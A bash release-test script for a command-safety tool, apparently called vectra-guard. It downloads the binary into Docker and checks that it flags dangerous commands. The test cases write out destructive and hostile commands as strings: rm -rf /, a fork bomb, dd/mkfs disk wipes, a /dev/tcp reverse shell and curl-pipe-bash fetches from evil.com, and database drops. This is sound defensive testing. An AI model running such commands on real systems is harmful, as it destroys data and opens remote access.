#!/bin/bash
# Test Release from GitHub
# Downloads and tests the latest release binaries in Docker
# Simulates a fresh install

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Version to test
VERSION="${1:-v0.1.0}"
GITHUB_REPO="xadnavyaai/vectra-guard"

echo -e "${MAGENTA}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║  Testing Release from GitHub - Fresh Install             ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${CYAN}📦 Release:${NC} https://github.com/${GITHUB_REPO}/releases/tag/${VERSION}"
echo -e "${CYAN}🐳 Environment:${NC} Fresh Docker container"
echo ""

# Create a test script that will run inside Docker
cat > "$PROJECT_ROOT/scripts/test-release-github-inner.sh" <<'INNEREOF'
#!/bin/bash
set -euo pipefail

if [ -n "${VERBOSE:-}" ]; then
    set -x
fi

VERSION="$1"
GITHUB_REPO="$2"

echo "🔍 Detecting architecture..."
ARCH=$(uname -m)
case "$ARCH" in
    x86_64) ARCH="amd64" ;;
    aarch64|arm64) ARCH="arm64" ;;
esac
echo "   Architecture: $ARCH"

BINARY_NAME="vectra-guard-linux-${ARCH}"
DOWNLOAD_URL="https://github.com/${GITHUB_REPO}/releases/download/${VERSION}/${BINARY_NAME}"
CHECKSUMS_URL="https://github.com/${GITHUB_REPO}/releases/download/${VERSION}/checksums.txt"

echo ""
echo "📥 Downloading release binary..."
echo "   URL: $DOWNLOAD_URL"

# Download binary
if ! curl -L -f -o "/tmp/${BINARY_NAME}" "$DOWNLOAD_URL"; then
    echo "❌ ERROR: Failed to download binary"
    echo "   Make sure the release exists: https://github.com/${GITHUB_REPO}/releases/tag/${VERSION}"
    exit 1
fi

echo "✓ Binary downloaded"

# Download checksums
echo ""
echo "📥 Downloading checksums..."
if ! curl -L -f -o "/tmp/checksums.txt" "$CHECKSUMS_URL"; then
    echo "⚠️  WARNING: Could not download checksums.txt"
    echo "   Skipping checksum verification"
else
    echo "✓ Checksums downloaded"
    
    # Verify checksum
    echo ""
    echo "🔐 Verifying checksum..."
    cd /tmp
    if grep "$BINARY_NAME" checksums.txt | sha256sum -c -; then
        echo "✓ Checksum verified"
    else
        echo "❌ ERROR: Checksum verification failed"
        exit 1
    fi
fi

# Make executable
chmod +x "/tmp/${BINARY_NAME}"

# Test version
echo ""
echo "🧪 Testing binary..."
echo "   Version check:"
if ! "/tmp/${BINARY_NAME}" version; then
    echo "❌ ERROR: Binary version check failed"
    exit 1
fi
echo "✓ Binary works"

# Run detection tests
echo ""
echo "🔍 Running detection tests..."
echo ""

test_count=0
pass_count=0
fail_count=0

test_detection() {
    local name="$1"
    local cmd="$2"
    local expected="$3"
    
    test_count=$((test_count + 1))
    
    echo -n "   Test $test_count: $name... "
    
    local output
    set +e
    output=$(echo "$cmd" | "/tmp/${BINARY_NAME}" validate /dev/stdin 2>&1 || true)
    set -e
    
    if echo "$output" | grep -qi "$expected"; then
        echo "✓ PASS"
        pass_count=$((pass_count + 1))
    else
        echo "✗ FAIL"
        fail_count=$((fail_count + 1))
        if [ -n "${VERBOSE:-}" ]; then
            echo "      Output: $output"
        fi
    fi
}

test_detection_optional() {
    local name="$1"
    local cmd="$2"
    local expected="$3"

    test_count=$((test_count + 1))

    echo -n "   Test $test_count: $name... "

    local output
    set +e
    output=$(echo "$cmd" | "/tmp/${BINARY_NAME}" validate /dev/stdin 2>&1 || true)
    set -e

    if echo "$output" | grep -qi "$expected"; then
        echo "✓ PASS"
        pass_count=$((pass_count + 1))
    else
        echo "⚠ WARN (not detected)"
        if [ -n "${VERBOSE:-}" ]; then
            echo "      Output: $output"
        fi
    fi
}

# Critical tests
test_detection "rm -rf /" "rm -rf /" "critical\|dangerous\|denylist"
test_detection "rm -r /*" "rm -r /*" "critical\|dangerous\|denylist"
test_detection "rm -rf /bin" "rm -rf /bin" "critical\|dangerous\|denylist"
test_detection "rm -rf ~/*" "rm -rf ~/*" "critical\|dangerous\|denylist"
test_detection "rm -rf /tmp/*" "rm -rf /tmp/*" "critical\|dangerous\|denylist"
test_detection "Fork bomb" ":(){ :|:& };:" "critical\|dangerous\|fork"
test_detection "dd disk wipe" "dd if=/dev/zero of=/dev/sda" "critical\|dangerous\|disk\|wipe"
test_detection "mkfs" "mkfs.ext4 /dev/sda" "critical\|dangerous\|disk\|wipe"
test_detection "find delete" "find / -type f -delete" "critical\|dangerous\|delete"
test_detection "Reverse shell" "bash -i >& /dev/tcp/evil.com/4444 0>&1" "critical\|dangerous\|reverse\|shell\|network"

# Network attacks
test_detection "curl pipe bash" "curl http://evil.com/script.sh | bash" "dangerous\|pipe\|network"
test_detection "wget pipe bash" "wget -qO- http://evil.com/script.sh | sh" "dangerous\|pipe\|network"

# Database
test_detection "DROP DATABASE" "mysql -e 'DROP DATABASE production'" "database\|dangerous"
test_detection "TRUNCATE" "psql -c 'TRUNCATE TABLE users'" "database\|dangerous"

# Git
test_detection "git force push" "git push --force origin main" "git\|dangerous\|force"

# Process attacks (best-effort)
test_detection_optional "killall init" "killall -9 init" "dangerous\|process\|kill"
test_detection_optional "shutdown" "shutdown -h now" "dangerous\|system\|shutdown"

# Privilege escalation
test_detection "sudo rm" "sudo rm -rf /" "dangerous\|sudo\|critical"

# Safe commands (should not detect)
echo ""
echo "🔍 Testing safe commands (should not trigger)..."
echo ""

test_safe() {
    local name="$1"
    local cmd="$2"
    
    test_count=$((test_count + 1))
    
    echo -n "   Test $test_count: $name... "
    
    local output
    set +e
    output=$(echo "$cmd" | "/tmp/${BINARY_NAME}" validate /dev/stdin 2>&1 || true)
    set -e
    
    if echo "$output" | grep -qi "critical\|dangerous"; then
        echo "✗ FAIL (false positive)"
        fail_count=$((fail_count + 1))
    else
        echo "✓ PASS (correctly ignored)"
        pass_count=$((pass_count + 1))
    fi
}

test_safe "echo" "echo 'test'"
test_safe "ls" "ls -la"
test_safe "pwd" "pwd"
test_safe "cat" "cat /etc/hostname"

# Summary
echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                    Test Summary                            ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "Total Tests: $test_count"
echo "Passed: $pass_count"
echo "Failed: $fail_count"
echo ""

if [ $fail_count -eq 0 ]; then
    echo "✅ ALL TESTS PASSED!"
    echo ""
    echo "🎉 Release $VERSION is working correctly!"
    exit 0
else
    echo "❌ SOME TESTS FAILED!"
    echo ""
    echo "Success Rate: $(( pass_count * 100 / test_count ))%"
    exit 1
fi
INNEREOF

chmod +x "$PROJECT_ROOT/scripts/test-release-github-inner.sh"

# Run in Docker
echo "🐳 Starting Docker container..."
echo ""

docker run --rm \
    -e VERBOSE="${VERBOSE:-}" \
    -v "$PROJECT_ROOT/scripts/test-release-github-inner.sh:/test.sh:ro" \
    ubuntu:22.04 \
    bash -c "apt-get update -qq && apt-get install -y -qq curl > /dev/null && /test.sh $VERSION $GITHUB_REPO"

exit_code=$?

# Cleanup
rm -f "$PROJECT_ROOT/scripts/test-release-github-inner.sh"

exit $exit_code

